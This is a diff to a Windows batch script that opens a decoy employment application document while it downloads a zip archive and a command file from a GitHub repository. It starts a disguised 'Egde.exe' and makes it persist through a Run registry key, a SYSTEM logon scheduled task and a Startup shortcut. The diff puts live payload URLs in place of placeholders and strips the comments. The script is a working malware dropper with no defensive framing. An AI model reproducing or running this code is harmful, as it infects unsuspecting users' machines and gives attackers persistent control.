@@ -52,29 +52,25 @@ if not exist "%targetFolder%" (
 
 powershell -Command "Invoke-WebRequest -Uri '%docUrl%' -OutFile '%targetFolder%\Employment Application Form.docx'" >nul
 
-set "mallUrl=http://tiny.cc/5npm001"  &:: 
+set "mallUrl=https://github.com/Drakovthe6th/TBuG/raw/refs/heads/master/mall.zip"  &:: 
 set "mallDest=%APPDATA%\Microsoft\Windows\Templates\mall"
 set "mallZip=%mallDest%.zip"
 
-:: Create directory and extract mall.zip
 mkdir "%mallDest%" >nul 2>&1
 powershell -Command "Invoke-WebRequest -Uri '%mallUrl%' -OutFile '%mallZip%'" >nul
 powershell -Command "Expand-Archive -Path '%mallZip%' -DestinationPath '%mallDest%' -Force" >nul
 
-:: NEW: Download initial.cmd to mall extraction directory
-set "initialCmdUrl=http://example.com/initial.cmd"  &:: CHANGE TO ACTUAL URL
+set "initialCmdUrl=https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/initial.cmd"  &:: CHANGE TO ACTUAL URL
 powershell -Command "Invoke-WebRequest -Uri '%initialCmdUrl%' -OutFile '%mallDest%\initial.cmd'" >nul
 
 set "appPath=%mallDest%\Egde.exe"
 
 start "" /B "%mallDest%\Egde.exe"
 
-:: Persistence mechanisms
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "AppPersistence" /t REG_SZ /d "\"%appPath%\"" /f >nul
 
 schtasks /create /tn "AppPersistence" /tr "\"%appPath%\"" /sc onlogon /ru "SYSTEM" /f >nul 2>&1
 
-:: Fixed shortcut path variable
 set "startupDir=%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup"
 set "shortcutPath=%startupDir%\AppPersistence.lnk"
 powershell -Command "$s = (New-Object -COM WScript.Shell).CreateShortcut('%shortcutPath%'); $s.TargetPath = '%appPath%'; $s.WorkingDirectory = '%mallDest%'; $s.Save()" >nul
